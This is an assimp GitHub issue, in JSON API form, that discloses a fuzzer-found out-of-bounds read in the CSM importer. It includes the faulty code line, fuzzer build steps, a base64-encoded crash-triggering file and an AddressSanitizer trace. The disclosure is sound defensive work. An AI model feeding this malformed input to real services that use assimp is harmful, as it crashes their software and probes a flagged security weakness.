{"url":"https://api.github.com/repos/assimp/assimp/issues/6012","repository_url":"https://api.github.com/repos/assimp/assimp","labels_url":"https://api.github.com/repos/assimp/assimp/issues/6012/labels{/name}","comments_url":"https://api.github.com/repos/assimp/assimp/issues/6012/comments","events_url":"https://api.github.com/repos/assimp/assimp/issues/6012/events","html_url":"https://github.com/assimp/assimp/issues/6012","id":2877369817,"node_id":"I_kwDOAAnkjM6rgS3Z","number":6012,"title":"Bug: Out-of-bounds Read in Assimp::CSMImporter::InternReadFile","user":{"login":"d3ng03","id":110011460,"node_id":"U_kgDOBo6kRA","avatar_url":"https://avatars.githubusercontent.com/u/110011460?v=4","gravatar_id":"","url":"https://api.github.com/users/d3ng03","html_url":"https://github.com/d3ng03","followers_url":"https://api.github.com/users/d3ng03/followers","following_url":"https://api.github.com/users/d3ng03/following{/other_user}","gists_url":"https://api.github.com/users/d3ng03/gists{/gist_id}","starred_url":"https://api.github.com/users/d3ng03/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/d3ng03/subscriptions","organizations_url":"https://api.github.com/users/d3ng03/orgs","repos_url":"https://api.github.com/users/d3ng03/repos","events_url":"https://api.github.com/users/d3ng03/events{/privacy}","received_events_url":"https://api.github.com/users/d3ng03/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":244436167,"node_id":"MDU6TGFiZWwyNDQ0MzYxNjc=","url":"https://api.github.com/repos/assimp/assimp/labels/Bug","name":"Bug","color":"bfe5bf","default":false,"description":"Global flag to mark a deviation from expected behaviour"},{"id":2238868387,"node_id":"MDU6TGFiZWwyMjM4ODY4Mzg3","url":"https://api.github.com/repos/assimp/assimp/labels/Fuzzer","name":"Fuzzer","color":"c5def5","default":false,"description":"Bugs found by a fuzzer"},{"id":8287495077,"node_id":"LA_kwDOAAnkjM8AAAAB7fkjpQ","url":"https://api.github.com/repos/assimp/assimp/labels/Security%20Risk","name":"Security Risk","color":"bfd4f2","default":false,"description":"Bugs that could potentially be security vulnerabilities"},{"id":8289048789,"node_id":"LA_kwDOAAnkjM8AAAAB7hDY1Q","url":"https://api.github.com/repos/assimp/assimp/labels/CSM","name":"CSM","color":"0052cc","default":false,"description":"Bugs related to the CSM format."}],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":2,"created_at":"2025-02-25T07:29:25Z","updated_at":"2025-06-08T10:10:13Z","closed_at":"2025-05-01T20:56:53Z","author_association":"NONE","type":{"id":101701,"node_id":"IT_kwDOAAQNPc4AAY1F","name":"Bug","description":"An unexpected problem or behavior","color":"red","created_at":"2024-01-25T09:11:49Z","updated_at":"2024-07-26T10:05:04Z","is_enabled":true},"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Summary\n\nOut-of-bounds Read in `Assimp::CSMImporter::InternReadFile`. An attacker could potentially exploit the vulnerability to cause a remote code execution, if they can trick the victim into running assimp on a malformed CSM file.\n\n### Affected\n\nassimp>=5.4.3\n\n### Details\n\nIn `code/AssetLib/CSM/CSMLoader.cpp:272`, user can arbitrary read memory using `na` which lead to OOB read.\n\n```cpp\naiMatrix4x4::Translation(na->mPositionKeys[0].mValue, nd->mTransformation);\n```\n\nUsing `aiMatrix4x4t<TReal>& aiMatrix4x4t<TReal>::Translation`, attacker can leak arbitrary memory value.\n\n```cpp\ntemplate <typename TReal>\nAI_FORCE_INLINE aiMatrix4x4t<TReal>& aiMatrix4x4t<TReal>::Translation( const aiVector3t<TReal>& v, aiMatrix4x4t<TReal>& out) {\n    out = aiMatrix4x4t<TReal>();\n    out.a4 = v.x;\n    out.b4 = v.y;\n    out.c4 = v.z;\n    return out;\n}\n```\n\nFor PoC, it got crash reading null pointer.\n\n```bash\ngdb-peda$ p na->mPositionKeys[0]\nCannot access memory at address 0x0\ngdb-peda$ p na->mPositionKeys[0].mValue\nCannot access memory at address 0x8\n```\n\n### PoC\n\n1. build assimp with sanitizer\n\n```bash\ngit clone https://github.com/assimp/assimp.git && cd assimp\n\ncmake CMakeLists.txt -G \"Ninja\" -DBUILD_SHARED_LIBS=OFF -DASSIMP_BUILD_ZLIB=ON \\\n                    -DASSIMP_BUILD_TESTS=OFF -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \\\n                    -DASSIMP_BUILD_SAMPLES=OFF\ncmake --build .\n\nclang -fsanitize=address,fuzzer -std=c++11 -Iinclude fuzz/assimp_fuzzer.cc -o assimp_fuzzer ./lib/libassimp.a ./contrib/zlib/libzlibstatic.a\n```\n\n1. run fuzzer to trigger bug\n\n```bash\necho \"TFdTJyBBJw0gTG9hZE9iag0NDSQkJCQkJCQkJCQkJCQkJCRGaXJzdEZyYW1lDSAxJEYkXyQkJCR0\nUG9pbv8NITEkRmlsZU5hbWUMdGxsPAZOX18kOi8vczEvDQ0NDQ0NIExvYWRPYmoNDQ0kJCQkICQk\nJG9yZGVyIEEnDSBMb2FkT2JqDQ0NJCQkJCQkJCQkJCQkJCQkJEZpcnN0RnJhbWUNIDEkRiRfJCQk\nJJdQb2lu/w0hMSRGaWxlTmFtZQx0bGxGJF8kJCQkJGxhc1Bpdm90UG9pbv//IDEkRiQkRmlyc3RG\ncmFtZQ0gMSRGJF8kJCQkdFBvaW7/DSExJEZpbGVOYW1lDHRsbDwGTl9fJDovL3MxLw0NDQ0NDSBM\nb2FkT2JqDQ0NJCQkJCAkJCRpbGVOYW1lDHRsbDwGTl9fJDovL3NMV1NDIEEkDSBMb2FkT2JsZU5h\nbWUMdGxsPAZOX18kOi8vcz4AZm8=\" | base64 -d > crash\n\n./assimp_fuzzer ./crash\n```\n\n### Sanitizer Report\n\n```bash\n=================================================================\n==1301==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000008 (pc 0x55950b268db0 bp 0x7ffc6eb4a3d0 sp 0x7ffc6eb4a240 T0)\n==1301==The signal is caused by a READ memory access.\n==1301==Hint: address points to the zero page.\n    #0 0x55950b268db0 in aiMatrix4x4t<float>::Translation(aiVector3t<float> const&, aiMatrix4x4t<float>&) /workspace/assimp_fuzzer/assimp_asan/include/assimp/matrix4x4.inl:636:16\n    #1 0x55950b655104 in Assimp::CSMImporter::InternReadFile(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, aiScene*, Assimp::IOSystem*) /workspace/assimp_fuzzer/assimp_asan/code/AssetLib/CSM/CSMLoader.cpp:272:9\n    #2 0x55950b27aa12 in Assimp::BaseImporter::ReadFile(Assimp::Importer*, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, Assimp::IOSystem*) /workspace/assimp_fuzzer/assimp_asan/code/Common/BaseImporter.cpp:131:9\n    #3 0x55950acf57e4 in Assimp::Importer::ReadFile(char const*, unsigned int) /workspace/assimp_fuzzer/assimp_asan/code/Common/Importer.cpp:709:30\n    #4 0x55950acf30a2 in Assimp::Importer::ReadFileFromMemory(void const*, unsigned long, unsigned int, char const*) /workspace/assimp_fuzzer/assimp_asan/code/Common/Importer.cpp:507:9\n    #5 0x55950acee717 in LLVMFuzzerTestOneInput (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x491717) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #6 0x55950ac17203 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3ba203) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #7 0x55950ac00f7f in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3a3f7f) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #8 0x55950ac06cd6 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3a9cd6) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #9 0x55950ac30af2 in main (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x3d3af2) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n    #10 0x7f162d0b6d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #11 0x7f162d0b6e3f in __libc_start_main csu/../csu/libc-start.c:392:3\n    #12 0x55950abfb844 in _start (/workspace/assimp_fuzzer/assimp_asan/assimp_fuzzer+0x39e844) (BuildId: 14559a9c5adc933a1ee50e87be18a77fe0b33b01)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /workspace/assimp_fuzzer/assimp_asan/include/assimp/matrix4x4.inl:636:16 in aiMatrix4x4t<float>::Translation(aiVector3t<float> const&, aiMatrix4x4t<float>&)\n==1301==ABORTING\n```\n\n---\n\n### Common weakness enumerator (CWE)\n\n- CWE-125: Out-of-bounds Read","closed_by":{"login":"kimkulling","id":2323156,"node_id":"MDQ6VXNlcjIzMjMxNTY=","avatar_url":"https://avatars.githubusercontent.com/u/2323156?v=4","gravatar_id":"","url":"https://api.github.com/users/kimkulling","html_url":"https://github.com/kimkulling","followers_url":"https://api.github.com/users/kimkulling/followers","following_url":"https://api.github.com/users/kimkulling/following{/other_user}","gists_url":"https://api.github.com/users/kimkulling/gists{/gist_id}","starred_url":"https://api.github.com/users/kimkulling/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/kimkulling/subscriptions","organizations_url":"https://api.github.com/users/kimkulling/orgs","repos_url":"https://api.github.com/users/kimkulling/repos","events_url":"https://api.github.com/users/kimkulling/events{/privacy}","received_events_url":"https://api.github.com/users/kimkulling/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/assimp/assimp/issues/6012/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/assimp/assimp/issues/6012/timeline","performed_via_github_app":null,"state_reason":"completed"}